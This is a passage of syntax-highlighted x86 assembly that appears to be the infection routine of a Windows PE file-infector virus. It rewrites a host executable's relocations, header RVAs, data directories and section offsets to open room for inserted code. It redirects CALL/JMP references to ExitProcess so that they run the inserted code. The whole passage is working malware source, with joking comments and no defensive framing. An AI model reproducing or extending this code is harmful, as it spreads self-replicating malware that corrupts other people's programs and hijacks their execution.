        </span><span class="sc1">; Now we update all references inside code to things that point after</span><span class="sc0">
        </span><span class="sc1">; the RVA of the hole we are creating. For that, we use .reloc info.</span><span class="sc0">
        </span><span class="sc5">@@UpdateCodeSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the relocation data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@LoopUpdate_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; If it's void, end the fixing of</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; the code</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AllUpdated</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
      </span><span class="sc5">@@LoopUpdate_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Did we updated all the references</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@PageUpdated</span><span class="sc0">      </span><span class="sc1">; for this page? If it's so, go to</span><span class="sc0">
                                         </span><span class="sc1">; update the next page.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; Get the fix address</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2FFFh</span><span class="sc0">       </span><span class="sc1">; If it's not Intel ( &lt;0x3000) don't</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@LoopUpdate_01</span><span class="sc0">    </span><span class="sc1">; fix it</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EBX = RVA of address to relocate</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; If we are making the data hole,</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateCodeSec_Cont00</span><span class="sc0">    </span><span class="sc1">; we add the text hole size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_TextHole</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; if the update is after the</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateCodeSec_Cont00</span><span class="sc0">    </span><span class="sc1">; the text hole</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHoleSize</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@UpdateCodeSec_Cont00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0"> </span><span class="sc1">; Get the address in the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; mapping for this virtual addr.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopUpdate_01</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; Get the virtual address where</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the DWORD we are updating</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; points to.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; If it points after the virtual</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@TranslateOK_02</span><span class="sc0">    </span><span class="sc1">; address of the hole, update it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@TranslateOK_02</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;; Now we check if that DWORD points to ExitProcess. If it does, we make it</span><span class="sc0">
</span><span class="sc1">;; point to the code hole.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get if it's CALL or JMP</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckExitProcess</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0">         </span><span class="sc1">; If it's not CALL/JMP DWORD PTR,</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNotExitProcess</span><span class="sc0">  </span><span class="sc1">; don't take action!</span><span class="sc0">
        </span><span class="sc5">@@CheckExitProcess</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check it it's a CALL/</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ItsNotExitProcess</span><span class="sc0">             </span><span class="sc1">; /JMP to ExitProcess</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">; Get the virtual address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PatchExitProcess</span><span class="sc0">       </span><span class="sc1">; Patch the ExitProcess</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Break possible APICALL_END mistranslation</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; We anulate the .reloc reference</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFF0000h</span><span class="sc0">   </span><span class="sc1">; to avoid other update</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopUpdate_01</span><span class="sc0">
      </span><span class="sc5">@@ItsNotExitProcess</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">@@TranslateOK</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Get the next relocation value</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopUpdate_01</span><span class="sc0">
      </span><span class="sc5">@@PageUpdated</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopUpdate_00</span><span class="sc0">
      </span><span class="sc5">@@AllUpdated</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;; Now we update some RVAs at the PE header. If we are making the code hole,</span><span class="sc0">
</span><span class="sc1">;; since it's at the end of the section, we update the data checking with</span><span class="sc0">
</span><span class="sc1">;; JB (the x86 conditional jump, not the whisky! And now make a mental image</span><span class="sc0">
</span><span class="sc1">;; of "checking the data with JB": me, with the computer, and a glass with ice</span><span class="sc0">
</span><span class="sc1">;; and JB in my hand checking opcodes XD). If we are making the</span><span class="sc0">
</span><span class="sc1">;; data hole, we check them with JBE (ooooh, that's not whisky!).</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; RVA to the (possible) symbol table</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Fixed_01</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NotFixed_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Fixed_01</span><span class="sc0">
        </span><span class="sc5">@@NotFixed_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@Fixed_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; RVA to the entrypoint</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Fixed_02</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NotFixed_02</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Fixed_02</span><span class="sc0">
        </span><span class="sc5">@@NotFixed_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@Fixed_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; RVA to the base of code</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Fixed_03</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NotFixed_03</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Fixed_03</span><span class="sc0">
        </span><span class="sc5">@@NotFixed_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@Fixed_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; RVA to the base of data</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Fixed_04</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NotFixed_04</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Fixed_04</span><span class="sc0">
        </span><span class="sc5">@@NotFixed_04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@Fixed_04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; Increase the size of the image</span><span class="sc0">
                                          </span><span class="sc1">; by the size of the hole.</span><span class="sc0">

       </span><span class="sc1">; Now we update the virtual offsets of the directories</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the number of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; directories</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc5">@@LoopDir_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; If it's the security directory,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextDir_01</span><span class="sc0">        </span><span class="sc1">; don't update the address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NextDir_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc5">@@NextDir_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopDir_01</span><span class="sc0">

      </span><span class="sc1">;; Now we update the physical &amp; virtual offsets of the sections</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartOfSectionHeaders</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakingDataHole_2</span><span class="sc0">
      </span><span class="sc5">@@MakingCodeHole_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EBX = Physical offset of the hole</span><span class="sc0">
      </span><span class="sc5">@@MakingDataHole_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">     </span><span class="sc1">; Get the number of sections</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@LoopUpdate_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check the section addresses. As we</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; did before, if we are making the</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NextSection_00</span><span class="sc0">  </span><span class="sc1">; hole at code we check the physical</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; and virtual addresses and we update</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection_00_</span><span class="sc0"> </span><span class="sc1">; them if they are below. If we are</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; making the data hole (at the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextSection_00</span><span class="sc0">  </span><span class="sc1">; beginning of the data section) we</span><span class="sc0">
      </span><span class="sc5">@@NextSection_00_</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; check if the address is below or</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; equal.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@NextSection_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
